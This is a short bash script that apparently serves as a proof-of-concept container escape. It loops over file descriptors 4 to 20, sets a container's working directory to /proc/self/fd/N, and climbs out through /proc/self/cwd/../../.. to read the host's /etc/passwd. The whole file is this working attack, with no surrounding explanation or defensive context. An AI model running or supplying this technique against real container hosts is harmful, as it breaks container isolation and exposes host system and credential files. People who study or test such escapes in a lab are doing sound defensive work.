#! /bin/bash
for i in {4..20}; do
    sudo ./docker run -it --rm -w /proc/self/fd/$i alpine:3.14.3 sh -c "tail /proc/self/cwd/../../../etc/passwd"
    echo ""
done